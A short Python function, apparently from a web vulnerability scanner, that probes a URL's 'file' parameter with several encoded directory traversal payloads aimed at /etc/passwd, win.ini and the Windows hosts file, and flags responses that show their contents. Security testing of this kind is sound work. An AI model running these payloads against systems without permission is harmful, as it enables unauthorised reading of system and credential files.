import requests

def detect_directory_traversal(url, proxy=None):
    payloads = [
        "../../etc/passwd", 
        "..\\..\\windows\\system32\\drivers\\etc\\hosts", 
        "%2E%2E%2F%2E%2E%2Fetc/passwd", 
        "..%255c..%255cwindows\\win.ini"
    ]
    
    headers = {'User-Agent': 'Mozilla/5.0'}
    results = []

    for payload in payloads:
        try:
            traversal_url = f"{url}?file={payload}"
            proxies = {"http": proxy, "https": proxy} if proxy else None
            response = requests.get(traversal_url, headers=headers, proxies=proxies)

            if "root:x" in response.text or "extensions" in response.text:
                results.append(f"Directory Traversal found with payload: {payload}")
        except Exception as e:
            results.append(f"Error during Directory Traversal test: {str(e)}")

    return results if results else "No Directory Traversal vulnerabilities detected."